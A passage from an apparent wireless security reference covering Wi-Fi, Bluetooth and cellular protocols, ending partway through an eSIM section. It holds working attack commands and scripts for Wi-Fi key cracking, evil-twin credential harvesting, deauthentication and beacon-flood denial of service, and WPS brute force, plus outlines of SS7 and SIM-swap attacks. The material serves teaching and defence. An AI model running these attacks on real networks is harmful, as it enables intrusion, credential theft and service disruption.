# Wireless Security Reference

> Comprehensive technical reference for wireless security protocols, attack techniques, detection, and hardening. Part of the TeamStarWolf cybersecurity reference library.

---

## Table of Contents

1. [Wi-Fi Security Protocols](#1-wi-fi-security-protocols)
2. [Wi-Fi Attack Techniques](#2-wi-fi-attack-techniques)
3. [Bluetooth Security](#3-bluetooth-security)
4. [Cellular Security (4G/5G)](#4-cellular-security-4g5g)
5. [Zigbee, Z-Wave, and IoT Protocols](#5-zigbee-z-wave-and-iot-protocols)
6. [RFID and NFC Security](#6-rfid-and-nfc-security)
7. [Wireless Intrusion Detection/Prevention](#7-wireless-intrusion-detectionprevention)
8. [Wireless Penetration Testing](#8-wireless-penetration-testing)
9. [Wireless Hardening](#9-wireless-hardening)
10. [Standards and Frameworks](#10-standards-and-frameworks)

---

## 1. Wi-Fi Security Protocols

### 1.1 WEP (Wired Equivalent Privacy) — Legacy / Broken

WEP was ratified in 1997 as part of the original IEEE 802.11 standard. It was designed to provide data confidentiality equivalent to a wired LAN but is now considered completely broken and should never be used.

#### RC4 Cipher and IV Reuse

WEP uses RC4 (Rivest Cipher 4), a stream cipher. Every packet is encrypted with a keystream derived from:

```
keystream = RC4(IV || WEP_Key)
```

- The **Initialization Vector (IV)** is 24 bits — only 16,777,216 possible values.
- IVs are transmitted in plaintext in the packet header.
- In a busy network, IV collisions occur within minutes to hours.
- When two packets share the same IV, XORing them cancels the keystream, exposing plaintext relationships.

**Weak IVs (FMS Attack):** In 2001, Fluhrer, Mantin, and Shamir identified that certain IV values (e.g., (3, 255, N)) leak the first byte of the RC4 key. Collecting ~1,000–2,000 weak IVs allows full key recovery. Tools like `aircrack-ng` automate this.

```
RC4 key schedule vulnerability:
  IV = (A+3, 255, X)  →  leaks key byte at position A
  Collect ~60,000 weak IVs → recover 104-bit key with high probability
```

#### ARP Injection / Interactive Packet Replay

Because WEP has no replay protection and the CRC-32 integrity check (ICV) is linear and malleable:

1. Capture a single encrypted ARP request.
2. Replay it thousands of times — each replay generates a new IV from the AP.
3. Capture enough IVs passively to crack the key in minutes.

```bash
# Aircrack-ng WEP crack workflow
airmon-ng start wlan0
airodump-ng wlan0mon                          # discover WEP network
airodump-ng -c <CH> --bssid <AP_MAC> -w wep_capture wlan0mon
aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> wlan0mon   # ARP replay
aircrack-ng wep_capture-01.cap               # crack key
```

**Bit-flipping attack:** An attacker can flip bits in the ciphertext and adjust the ICV, redirecting decrypted packets to an attacker-controlled IP — allowing decryption of one byte per 128 attempts on average.

#### CRC-32 / ICV Weakness

The Integrity Check Value in WEP is simply CRC-32 of the plaintext appended before encryption. CRC-32 is a linear checksum — not a cryptographic MAC. An attacker who knows some plaintext can:
- Predict CRC changes when flipping bits.
- Modify both ciphertext and ICV to produce a valid modified packet.
- WEP provides no message authentication, only a weak integrity check.

---

### 1.2 WPA / WPA2

#### WPA (Wi-Fi Protected Access) — 2003

WPA was an interim fix deployed via firmware updates while 802.11i was finalized. It introduced TKIP (Temporal Key Integrity Protocol) over RC4.

**TKIP improvements over WEP:**
- 48-bit IV (eliminates IV exhaustion for practical networks).
- Per-packet key mixing (IV + base key → unique per-packet key).
- Michael MIC (Message Integrity Code) — 64-bit, provides weak but better-than-nothing authentication.
- Sequence counter (TSC) to detect replays.

**TKIP Vulnerabilities:**

| Vulnerability | Description |
|---|---|
| Michael MIC weakness | 64-bit MIC brute-forceable in 2^64 attempts; chopchop-style attacks reduce to ~2^16 |
| Beck-Tews attack | Exploits WPA-TKIP to decrypt and inject short packets (QoS frames) using chopchop technique |
| Ohigashi-Morii attack | Extends Beck-Tews to work without QoS by using MITM to relay between two APs |
| RC4 biases | TKIP still uses RC4; 2013 RC4 bias attacks (Royal Holloway) partially recover keystreams |

**TKIP countermeasure:** Two MIC failures within 60 seconds triggers a 60-second lockout (MIC failure countermeasure). This limits chopchop attacks to one attempt per minute.

#### WPA2 (802.11i) — 2004

WPA2 replaced TKIP with CCMP (Counter Mode with CBC-MAC Protocol) based on AES-128. This eliminated the cryptographic weaknesses of RC4/TKIP.

**CCMP operation:**
- AES in Counter Mode for confidentiality.
- AES-CBC-MAC for integrity and authenticity.
- 48-bit Packet Number (PN) for replay protection.
- 128-bit key, 64-bit MIC.

**4-Way Handshake:**

The WPA2 4-way handshake establishes the PTK (Pairwise Transient Key) between client (STA) and AP:

```
AP → STA:  ANonce (random nonce from AP)
STA → AP:  SNonce + MIC  (STA computes PTK = PRF(PMK, ANonce, SNonce, AP_MAC, STA_MAC))
AP → STA:  GTK (Group Temporal Key) encrypted + MIC
STA → AP:  ACK
```

**PTK derivation:**
```
PTK = PRF-512(PMK, "Pairwise key expansion" || min(AA,SA) || max(AA,SA) || min(ANonce,SNonce) || max(ANonce,SNonce))
```

Components of the PTK (total 512 bits for CCMP):
- KCK (Key Confirmation Key) — 128 bits — used to compute MIC on handshake frames
- KEK (Key Encryption Key) — 128 bits — used to encrypt GTK
- TK (Temporal Key) — 128 bits — used for CCMP data encryption
- MIC Tx/Rx keys (if applicable)

**Handshake capture for offline cracking:**
The MIC in message 2 of the 4-way handshake is computed using the KCK derived from the PMK. If an attacker captures messages 1 and 2 (ANonce + SNonce + MIC), they can brute-force:
```
For each candidate_password:
    PMK = PBKDF2-SHA1(password, SSID, 4096, 32)
    PTK = PRF-512(PMK, ...)
    KCK = PTK[0:16]
    test_MIC = HMAC-SHA1(KCK, handshake_frame)[0:16]
    if test_MIC == captured_MIC: found!
```

**PMKID Attack (2018, Jens Steube):**

The PMKID is included in the first EAPOL frame (RSN IE) of the 4-way handshake:
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)
```

This allows cracking **without capturing a full 4-way handshake** — just a single frame from the AP, with no client deauth needed:

```bash
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3
hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 wordlist.txt -r rules/best64.rule
```

#### WPA2 Enterprise (802.1X/EAP)

In enterprise mode, the Pre-Shared Key (PSK) is replaced by 802.1X authentication:

```
Client (Supplicant) ↔ AP (Authenticator) ↔ RADIUS Server (Authentication Server)
```

EAP methods used with WPA2/WPA3 Enterprise:

| Method | Description | Security |
|---|---|---|
| EAP-TLS | Mutual certificate authentication | Strongest — both sides present certs |
| PEAP | Certificate on server side only; inner EAP (MSCHAPv2 or GTC) | Strong if server cert validated |
| EAP-TTLS | TLS tunnel; any inner authentication | Flexible; strong if cert validated |
| EAP-FAST | Cisco; uses PAC instead of certificate | Acceptable if PAC provisioned securely |
| LEAP | Cisco legacy; based on MS-CHAPv1 | Broken — do not use |

**PEAP/MSCHAPv2 vulnerability:** If clients do not validate the server certificate, an attacker can set up a rogue RADIUS server. The inner MSCHAPv2 exchange can be cracked offline using tools like `asleap` or relayed using techniques like `chapcrack`.

---

### 1.3 WPA3 — 2018

WPA3 addresses key WPA2 weaknesses, primarily dictionary attacks against PSK networks.

#### SAE (Simultaneous Authentication of Equals) — Dragonfly Handshake

SAE replaces the PSK 4-way handshake with a zero-knowledge proof of password knowledge based on the Diffie-Hellman Dragonfly key exchange (RFC 7664).

**Properties:**
- **Forward secrecy:** Each session generates a fresh PMK; capturing old traffic cannot be decrypted even if the password is later disclosed.
- **Offline dictionary attack resistance:** No MIC over password-derived key material is sent in the clear; brute-force requires an active online interaction per guess.
- **Equal authentication:** Neither side is purely the authenticator; both prove knowledge simultaneously.

**SAE commit-confirm exchange:**
```
STA → AP:  Commit(scalar_s, element_E_s)   [blinded password element]
AP → STA:  Commit(scalar_a, element_E_a)
STA → AP:  Confirm(verifier_s)
AP → STA:  Confirm(verifier_a)
→ Both derive PMK = F(scalar_s + scalar_a, E_s * E_a)
```

The password is encoded into an elliptic curve point (or MODP group element) via a hash-to-curve algorithm, making offline guessing infeasible.

#### WPA3 Transition Mode

Networks can simultaneously support WPA2 and WPA3 clients using transition mode. This exposes the network to downgrade attacks.

#### Dragonblood Vulnerabilities (2019)

Researchers Vanhoef and Ronen discovered multiple vulnerabilities in WPA3-Personal (SAE):

| CVE | Name | Description |
|---|---|---|
| CVE-2019-9494 | Cache-based side channel | Timing/cache differences in password encoding leak information; enables offline dictionary attack |
| CVE-2019-9496 | Confirm bypass | Malformed confirm frame bypasses authentication in some implementations |
| CVE-2019-9499 | Downgrade attack | In transition mode, force client to WPA2 for offline cracking |
| CVE-2019-9497 | Reflection attack | Reflect commit frame back to AP; partial authentication bypass |
| CVE-2019-9498 | Invalid curve attack | Use point on unexpected curve to recover password |

**Patches:** Wi-Fi Alliance issued guidance; vendors patched implementations. WPA3 Revision 1 (Dec 2019) addressed SAE hash-to-element via constant-time operations.

#### 802.11w Management Frame Protection (MFP)

Prior to 802.11w (2009), all management frames (deauth, disassoc, beacon, probe) were unauthenticated and unencrypted. This enabled deauth flood DoS and evil twin attacks.

802.11w protects unicast management frames:
- **Deauthentication / Disassociation:** Encrypted with CCMP using PTK.
- **SA Query:** Verifies client hasn't been hijacked.
- **Broadcast/multicast management frames:** Protected with BIP (Broadcast/Multicast Integrity Protocol) using IGTK.

**Modes:**
- `optional` (MFPC=1, MFPR=0) — capable but not required
- `required` (MFPC=1, MFPR=1) — only 802.11w clients may associate

WPA3 mandates 802.11w.

**Residual limitations:** An attacker can still send unprotected deauth frames if 802.11w is not required, forcing clients off. With 802.11w required, deauth floods fail because clients ignore unauthenticated deauth frames.

---

## 2. Wi-Fi Attack Techniques

### 2.1 Evil Twin / Rogue AP

An evil twin AP mimics a legitimate AP (same SSID, similar BSSID) to lure clients to associate with it. Traffic is then intercepted via MITM.

**Setup with hostapd-wpe:**

`hostapd-wpe` (WPE = Wireless Pwnage Edition) is a modified hostapd that logs EAP credentials:

```bash
# Install
apt-get install hostapd-wpe

# Example hostapd-wpe.conf
interface=wlan1
driver=nl80211
ssid=TargetCorporate
channel=6
hw_mode=g
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
wpe_logfile=/tmp/wpe_creds.log

# Launch
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

For personal networks (WPA2-PSK), use hostapd normally and capture the 4-way handshake from connecting clients.

**Captive portal evil twin:**
1. Clone legitimate AP (same SSID/BSSID spoofed on different channel).
2. Deauth clients from real AP — they connect to evil twin.
3. Serve captive portal requesting "re-authentication."
4. Harvest credentials in cleartext.

Tools: `WiFi-Pumpkin3`, `airbase-ng`, `Fluxion`, `wifiphisher`.

---

### 2.2 KARMA Attack

The KARMA attack exploits the 802.11 probe request mechanism. Client devices broadcast probe requests for previously associated networks (Preferred Network List / PNL):

```
Client: "Is anyone out there named 'HomeWifi'?"
KARMA AP: "Yes! I am HomeWifi!" (responds to any probe)
```

**Process:**
1. Enable promiscuous probe response in hostapd or a KARMA-capable device (WiFi Pineapple).
2. Listen for probe requests from clients.
3. Respond to each probe as if you are the requested AP.
4. Client auto-associates; attacker controls all traffic.

**Defense:** Modern OS behavior has changed — clients often send directed probes only, or use randomized MAC addresses. However, open networks without authentication remain vulnerable, as do devices with older OS versions.

**WiFi Pineapple** automates KARMA with a web UI and module system (PineAP).

---

### 2.3 WPA2 Handshake Capture and Offline Cracking

```bash
# Step 1: Enable monitor mode
airmon-ng check kill          # kill interfering processes
airmon-ng start wlan0         # creates wlan0mon

# Step 2: Discover targets
airodump-ng wlan0mon

# Step 3: Capture handshake (targeted)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: Force re-authentication via deauth (in separate terminal)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#   -0 5 = send 5 deauth packets
#   -a   = AP BSSID
#   -c   = client MAC (omit for broadcast deauth)

# Step 5: Crack the captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
aircrack-ng -w wordlist.txt -e "TargetSSID" capture-01.cap

# Using hashcat (faster — uses GPU)
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx wordlist.txt
# Or with newer format:
hashcat -m 22000 hash.22000 wordlist.txt -r rules/best64.rule --status
```

**PMKID Attack (no client needed):**

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3
# Wait for AP to respond; Ctrl+C after collecting PMKIDs

# Convert to hashcat format
hcxpcapngtool -o hash.22000 capture.pcapng
# Optionally extract only PMKID hashes:
hcxpcapngtool -o pmkid.22000 --only_pmkid capture.pcapng

# Crack
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d  # 8-digit mask
```

**Wordlist resources:**
- `/usr/share/wordlists/rockyou.txt` — 14M common passwords
- `crunch` — generate custom masks
- `hashcat` rules: `best64.rule`, `OneRuleToRuleThemAll.rule`
- `PACK` (Password Analysis and Cracking Kit) — analyze existing passwords for mask generation

---

### 2.4 WPA2 Enterprise Downgrade Attacks

When a network is configured in WPA3 transition mode or accepts multiple EAP methods, attackers can force weaker authentication:

**EAP downgrade:**
1. Stand up rogue AP accepting only EAP-MD5 or EAP-GTC.
2. If client accepts any EAP method, inner credentials are sent in weaker form.
3. MSCHAPv2 captured from PEAP can be cracked with `asleap`:

```bash
asleap -C <challenge> -R <response> -W wordlist.txt
# Or using hashcat mode 5500 (NetNTLMv1) or 5600 (NetNTLMv2)
hashcat -m 5500 "username:::challenge:response1:response2" wordlist.txt
```

**Certificate validation bypass:**
If clients don't pin the server certificate, an attacker can present any valid certificate. Tools like `FreeRADIUS-WPE` serve a self-signed cert matching the legitimate CN.

---

### 2.5 Captive Portal Attacks

Captive portals are used in hotels, airports, and cafes. Attack scenarios:

| Attack | Description |
|---|---|
| Credential harvesting | Clone the captive portal page; capture submitted username/password |
| SSID confusion | Same SSID but rogue AP serves different portal; credentials logged |
| Session hijacking | Steal authenticated MAC/IP after client passes portal |
| DNS rebinding | From inside captive portal, rebind DNS to attack internal services |
| SSL stripping | Downgrade HTTPS login page if HSTS not enforced |

**Wifiphisher** automates captive portal attacks:
```bash
wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade --handshake-capture capture.cap
```

---

### 2.6 Beacon Flooding DoS

Beacon frames announce an AP's presence. Flooding with fake beacons creates a phantom network fog, crashing Wi-Fi manager GUIs and confusing clients.

```bash
# mdk4 beacon flood
mdk4 wlan0mon b -n "FakeSSID" -g -t 54 -s 1000
# b = beacon flood mode
# -n = SSID (or file of SSIDs with -f)
# -g = 54 Mbps (802.11g)
# -s = speed (packets/sec)

# With random SSIDs and BSSIDs:
mdk4 wlan0mon b -c 6

# Auth DoS (exceed AP's client table):
mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF
```

**Impact:**
- Overwhelms wireless client scanning engines.
- Causes kernel crashes in some older wireless drivers.
- Degrades legitimate AP discovery for users.

---

### 2.7 Deauthentication Attacks

Deauth attacks exploit unauthenticated 802.11 management frames to forcibly disconnect clients:

```bash
# Broadcast deauth (disconnect all clients from AP):
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Targeted deauth:
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Using scapy (Python):
from scapy.all import *
dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="aa:bb:cc:dd:ee:ff", addr3="aa:bb:cc:dd:ee:ff")
deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
sendp(deauth, iface="wlan0mon", count=100, inter=0.1)
```

**Detection indicators:**
- Surge in Reason Code 7 (Class 3 frame received from nonassociated station) management frames.
- Client disconnect/reconnect cycling.
- 802.11w (MFP) deployment as countermeasure.

---

### 2.8 Wi-Fi Direct Security

Wi-Fi Direct (P2P) creates direct device-to-device connections without an AP:

**Security concerns:**
- Uses WPA2-PSK or WPS (PIN or PBC) for authentication.
- WPS PIN method is vulnerable to Pixie Dust and online brute-force attacks.
- P2P Group Owner (GO) becomes a soft AP; same attack surface as a real AP.
- Many devices auto-accept connection requests (Just Works mode).
- Residual group credentials can persist and be abused.

```bash
# WPS PIN brute force (against Wi-Fi Direct GO):
reaver -i wlan0mon -b <GO_BSSID> -vv
wash -i wlan0mon          # discover WPS-enabled APs and GO devices
```

---

## 3. Bluetooth Security

### 3.1 Bluetooth Classic vs. BLE Security Models

| Feature | Bluetooth Classic (BR/EDR) | Bluetooth Low Energy (BLE) |
|---|---|---|
| Frequency | 2.4 GHz, 79 channels, FHSS | 2.4 GHz, 40 channels |
| Pairing | Legacy PIN, SSP | LE Legacy, LE Secure Connections |
| Encryption | E0 (stream) or AES-CCM (BT 4.2+) | AES-CCM 128-bit |
| Key length | Up to 128-bit link key | 128-bit |
| Authentication | Shared link key (HMAC-SHA256 in SSP) | CMAC-AES |
| Roles | Master/Slave | Central/Peripheral |

### 3.2 Pairing Modes

#### Bluetooth Classic — Legacy PIN Pairing (pre-2.1)

- Both devices enter the same PIN.
- PIN → INIT_KEY → COMB_KEY (16 bytes).
- Vulnerable to passive eavesdropping and brute-force of PIN (4-6 digits).
- `btcrack` can crack 4-digit PINs from captured LMP frames.

#### Bluetooth Classic — Secure Simple Pairing (SSP, BT 2.1+)

SSP uses Elliptic Curve Diffie-Hellman (ECDH P-192) for key exchange plus one of four association models:

| Model | When Used | Security |
|---|---|---|
| Numeric Comparison | Both devices have display + keyboard | User compares 6-digit code; protects against MITM |
| Just Works | One or both devices lack UI | No MITM protection; vulnerable to interception |
| Out-of-Band (OOB) | NFC or other channel available | MITM protection from OOB channel |
| Passkey Entry | One display, one keyboard | 6-digit passkey; some MITM protection |

**ECDH key exchange (SSP):**
```
Public key: P = d × G  (d = private key, G = curve generator)
Shared secret: DHKey = dA × PB = dB × PA
Link key: derived from DHKey using commitment scheme
```

#### BLE Pairing

**LE Legacy Pairing (pre-4.2):**
- TK (Temporary Key) = 0 for Just Works, or 6-digit PIN for Passkey.
- STK = AES-ECB(TK, Srand || Mrand).
- **Vulnerable:** Passive eavesdroppers can crack 6-digit TK (max 1,000,000 attempts).
- Cracking tool: `crackle` — decrypts LE Legacy captures with known TK.

```bash
# Capture BLE traffic with Ubertooth
ubertooth-btle -f -c capture.pcap -A 37
# -f = follow connections
# -A 37 = start on advertising channel 37

# Crack LE Legacy pairing
crackle -i capture.pcap -o decrypted.pcap
```

**LE Secure Connections (BT 4.2+, LESC):**
- Uses ECDH P-256 for key agreement.
- LTK derived from DHKey — not brute-forceable passively.
- Numeric Comparison and OOB modes provide MITM protection.
- Replaces STK with LTK directly; no long-term key exposure.

---

### 3.3 Attack Techniques

#### BlueBorne (2017)

A set of eight vulnerabilities across Android, Linux, Windows, and iOS Bluetooth stacks. Key CVEs:

| CVE | Platform | Type |
|---|---|---|
| CVE-2017-0785 | Android | Information leak in SDP — 31 bytes of heap memory |
| CVE-2017-0781 | Android | RCE in BNEP (Bluetooth Network Encapsulation Protocol) |
| CVE-2017-0782 | Android | RCE in BNEP — integer overflow |
| CVE-2017-1000251 | Linux kernel | RCE in L2CAP — stack overflow |
| CVE-2017-1000250 | Linux BlueZ | Info leak in SDP |
| CVE-2017-8628 | Windows | MITM in Bluetooth network (BNEP) |

**Attack vector:** Over-the-air — no pairing required. The Bluetooth stack processes advertising/discovery frames before authentication. Device does not need to be in discoverable mode for some attacks.

**Patch:** All vendors released patches September 2017. Verify `BluetoothStack` version or apply OS updates.

#### BIAS Attack (Bluetooth Impersonation Attacks, 2020)

CVE-2020-10135 — Affects Bluetooth Classic Secure Connections:

- Exploits the asymmetry in role switching during connection establishment.
- Attacker masquerades as a previously paired device using a known BD_ADDR.
- By downgrading to Legacy authentication and switching roles mid-handshake, attacker can authenticate without knowing the link key.
- Affects most Bluetooth BR/EDR implementations.

```
1. Attacker knows victim's BD_ADDR (from prior scan)
2. Attacker initiates connection as master, claiming victim's BD_ADDR
3. Forces Legacy (non-SSP) authentication
4. Switches role before mutual authentication completes
5. Successfully authenticates without link key
```

**Fix:** Enforce Secure Connections Only mode; mandate mutual authentication.

#### KNOB Attack (Key Negotiation of Bluetooth, 2019)

CVE-2019-9506 — Bluetooth Classic:

- The entropy of the Bluetooth encryption key is negotiated in LMP (Link Manager Protocol).
- Valid entropy values: 1–16 bytes (specification allows 1 byte!).
- Attacker in the middle can reduce entropy to 1 byte → only 256 possible keys.
- Then brute-forces the 1-byte encryption key in real time.

```
Normal: Entropy = 16 bytes (128-bit key)
KNOB:   Force Entropy = 1 byte (8-bit key → 256 brute-force attempts)
```

Affects any Bluetooth Classic device that honors entropy reduction to 1 byte. Fixed via BT specification requiring minimum entropy of 7 bytes.

---

### 3.4 BLE Sniffing

```bash
# Ubertooth One — open-source BLE sniffer
ubertooth-btle -f -c capture.pcap        # follow connections (all channels)
ubertooth-btle -f -c capture.pcap -A 38  # start on adv channel 38
ubertooth-specan-ui                       # spectrum analyzer

# nRF Sniffer (Nordic Semiconductor)
# Configure in Wireshark via plugin
# Wireshark → Edit → Preferences → Protocols → DLT_USER → nRF Sniffer

# Wireshark BLE filters
btle.advertising_header.pdu_type == 0x00  # ADV_IND
btle.data_header.llid == 0x02              # L2CAP start
btl2cap                                    # L2CAP frames
btatt                                      # ATT protocol (GATT)
btsmp                                      # Security Manager Protocol (pairing)
```

---

### 3.5 BLE GATT Enumeration and Attack Surface

GATT (Generic Attribute Profile) defines how BLE devices exchange data:

```
GATT Server (peripheral)
└── Service (UUID)
    └── Characteristic (UUID)
        ├── Value
        ├── Properties (Read, Write, Notify, Indicate)
        └── Descriptors
```

**Enumeration tools:**

```bash
# gatttool (Linux)
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary                        # list services
> characteristics                # list characteristics
> char-read-hnd 0x0010           # read by handle
> char-write-req 0x0012 01       # write value

# gatt-explorer (Python)
pip install bluepy
python3 -c "
from bluepy.btle import Peripheral
p = Peripheral('AA:BB:CC:DD:EE:FF')
for svc in p.getServices():
    print(svc)
    for ch in svc.getCharacteristics():
        print('  ', ch, hex(ch.properties))
"

# bettercap BLE module
bettercap -eval "ble.recon on; events.stream on"
```

**Common attack vectors:**
- Unauthenticated write to control characteristics (door locks, medical devices).
- Replay attacks against fixed command sequences.
- Fuzzing GATT write handlers — heap overflow in custom firmware.
- Notification subscription to receive sensitive data (heart rate, glucose readings).
- Pairing downgrade to Just Works — sniff and replay.

---

### 3.6 Bluetooth Mesh Security

BT Mesh uses a layered security model:

| Layer | Key | Purpose |
|---|---|---|
| Network | NetKey | Encrypts/authenticates at network layer; all nodes in subnet share NetKey |
| Application | AppKey | Encrypts payload; bound to NetKey; shared among app-level nodes |
| Device | DevKey | Unique per node; used for provisioning and configuration |

**Provisioning security:**
- OOB Input/Output provides MITM protection during provisioning.
- Certificate-based provisioning (CBAP) uses X.509 for stronger identity.

**Attack surfaces:**
- Replay attacks if SEQ (24-bit sequence number) not properly managed.
- Key compromise — if NetKey is leaked, all network traffic is decryptable.
- IV update attack — forcing IV index change can replay old messages.
- Relay node compromise enables network-wide snooping.

---

### 3.7 AirDrop Security Issues

AirDrop uses Bluetooth Low Energy for discovery and Wi-Fi Direct for transfer.

**Hash truncation vulnerability (2021):**
- AirDrop broadcasts truncated SHA-256 hashes of sender's email/phone number in BLE advertising frames.
- Truncation to first 3 bytes (24 bits) → only 16.7M values.
- Brute-forceable against known contact lists.
- **PrivateDrop** (TU Darmstadt) proposed private set intersection as fix.
- **AirDrop name leakage:** macOS sends device name (containing full name by default) in the BLE TLV frame, visible to nearby non-Apple devices.

**CVE-2023-42941:** AirDrop could be forced to reveal sender identity to unauthenticated nearby devices.

---

## 4. Cellular Security (4G/5G)

### 4.1 LTE Security Architecture

LTE authentication uses a challenge-response protocol between the UE (User Equipment) and the core network:

**Key components:**
- **USIM** — SIM card containing IMSI, long-term key K, and authentication algorithms (MILENAGE or TUAK).
- **HSS** (Home Subscriber Server) — stores subscriber profile and generates AV (Authentication Vector).
- **MME** (Mobility Management Entity) — handles authentication and key agreement.
- **eNB** (eNodeB) — radio access node (base station).

**EPS-AKA (Authentication and Key Agreement):**
```
1. UE → MME:     Attach Request (IMSI or GUTI)
2. MME → HSS:    Authentication Information Request
3. HSS → MME:    AV = {RAND, AUTN, XRES, KASME}
                 AUTN = SQN ⊕ AK || AMF || MAC
4. MME → UE:     Authentication Request (RAND, AUTN)
5. UE verifies AUTN (network authentication)
6. UE → MME:     Authentication Response (RES)
7. MME verifies RES == XRES
→ Derive NAS keys, AS keys from KASME
```

**LTE key hierarchy:**
```
K (long-term, on USIM)
└── CK, IK (cipher/integrity keys)
    └── KASME (access security management entity key)
        ├── KNASenc (NAS encryption)
        ├── KNASint (NAS integrity)
        └── KeNB (base station key)
            ├── KUPenc (user plane encryption)
            ├── KRRCenc (RRC encryption)
            └── KRRCint (RRC integrity)
```

### 4.2 5G Security Improvements

5G (NR) introduced significant security enhancements:

| Feature | LTE | 5G NR |
|---|---|---|
| IMSI privacy | IMSI sent in cleartext initially | SUCI (Concealed Identifier using ECIES encryption) |
| Authentication | EPS-AKA | 5G-AKA or EAP-AKA' |
| Home control | Limited | HSEAF (Home network can verify authentication) |
| Slice security | N/A | Per-slice security contexts |
| NAS security | Integrity on select messages | Mandatory NAS integrity protection |
| Roaming security | Limited | SEPP (Security Edge Protection Proxy) |

**SUPI/SUCI (Identity Privacy):**
```
SUPI = Subscriber Permanent Identifier (replaces IMSI concept)
SUCI = f(SUPI, HNPK)  where HNPK = Home Network Public Key
      SUCI computed on device using ECIES (Elliptic Curve Integrated Encryption Scheme)
      Home network decrypts SUCI to recover SUPI
```

This prevents passive IMSI catchers from learning subscriber identities from registration messages.

**5G-AKA vs. EPS-AKA:**
- 5G-AKA adds **home network confirmation** — the AMF sends a proof-of-authentication back to the home network, preventing false authentication claims by visited networks.
- EAP-AKA' provides EAP framework compatibility for non-3GPP access.

---

### 4.3 IMSI Catchers (Stingrays)

IMSI catchers (IMSI grabbers, cell-site simulators, Stingrays) impersonate legitimate cell towers:

**Operation:**
1. Broadcast stronger signal than real towers — UEs connect preferentially.
2. Force UE to reveal IMSI (in LTE: send Identity Request after GUTI rejection).
3. Optionally act as MITM — relay to real network for transparent interception.
4. Some models jam 4G/5G to force fallback to 2G (GSM), where no authentication of the network is required.

**Detection methods:**
- **SnoopSnitch** (Android) — detects suspicious events: silent SMS, IMSI catcher indicators, protocol anomalies.
- **Android IMSI Catcher Detector (AIMSICD)** — monitors cell tower parameters for anomalies.
- Indicators: sudden 2G fallback, cell tower with unknown LAC/CID, excessive authentication requests, pilot signal strength inconsistency.

**Defense:**
- 5G SUCI prevents IMSI harvesting in 5G networks.
- Disable 2G fallback where possible (Android 12+ allows this).
- Monitor for Cell Broadcast anomalies.
- VPN reduces value of traffic interception.

---

### 4.4 SS7 Protocol Attacks

SS7 (Signaling System No. 7) is the protocol suite used for communication between telecom networks. Originally designed in 1975 with no authentication — any SS7 node is implicitly trusted.

**Key attack categories:**

#### Location Tracking

```
Attack: SendRoutingInfo (SRI) + ProvideSubscriberInfo (PSI)
1. Attacker obtains SS7 access (costs ~$1000 on underground markets)
2. Send SRI to victim's HLR using phone number → returns IMSI + current MSC
3. Send PSI to MSC → returns current cell ID (geographic area)
Result: Location accurate to a few hundred meters in urban areas
```

#### Call/SMS Interception

```
Attack: RegisterSS (call forwarding) or SMS interception via SRI
1. Register unconditional call forward to attacker's number using RegisterSS
2. All inbound calls redirected; victim unaware
3. SMS interception: modify SMS routing (Home Routing Info) to deliver to attacker
Result: Intercept 2FA SMS codes, forward calls
```

#### Denial of Service

```
Attack: CancelLocation
1. Send CancelLocation to HLR for victim's IMSI
2. HLR removes subscriber record → subscriber cannot make/receive calls
Result: Effective DoS until subscriber re-registers
```

**Mitigations:**
- SS7 firewalls (filtering SRI/PSI/CancelLocation by source).
- Monitoring for anomalous inter-network signaling.
- GSMA FS.11 and FS.07 security guidelines.
- Migration to Diameter (4G) and HTTP/2 (5G) with better authentication.

---

### 4.5 Diameter Protocol Vulnerabilities

Diameter replaced SS7's MAP protocol for 4G signaling. While improved, it retains vulnerabilities:

- **Routing Agent compromise:** Diameter proxies are implicitly trusted; a compromised DEA (Diameter Edge Agent) can launch all MAP-equivalent attacks.
- **S6a interface attacks:** Cancel-Location-Request, Insert-Subscriber-Data — same concepts as SS7 CancelLocation/PSI.
- **Rx/Gx interface abuse:** Quality of Service manipulation, bearer modification.
- **Roaming hub exposure:** Interconnect providers (IPX) create attack surface across multiple operators.

---

### 4.6 SIM Swapping

**Social engineering SIM swap:**
1. Attacker gathers PII (name, address, last 4 digits of SSN) from data breaches or social media.
2. Contacts carrier posing as victim; claims to have a new phone.
3. Carrier ports victim's number to attacker's SIM.
4. Attacker receives all SMS (including 2FA), intercepts calls.

**Technical SIM swap indicators:**
- Victim's phone suddenly loses signal.
- Victim receives "SIM changed" or "port out" notification.
- Attacker receives the victim's inbound SMS.

**Defenses:**
- Set carrier PIN/passcode requiring in-person verification.
- Use authenticator app (TOTP) instead of SMS-based 2FA.
- Use hardware security key (FIDO2) where possible.
- Carriers: AT&T NumberLock, T-Mobile Account Takeover Protection.

---

### 4.7 eSIM Security Architecture

eSIM (GSMA SGP.02/SGP.22) replaces physical SIM with an embedded secure element:

**Architecture:**
- **eUICC** (Embedded Universal Integrated Circuit Card) — hardware secure element.
- **SM-DP+** (Subscription Manager Data Preparation) — profile provisioning server.
- **SM-DS** (Discovery Server) — notifies device of available profiles.
- **LPA** (Local Profile Assistant) — on-device software managing profiles.

**Security controls:**
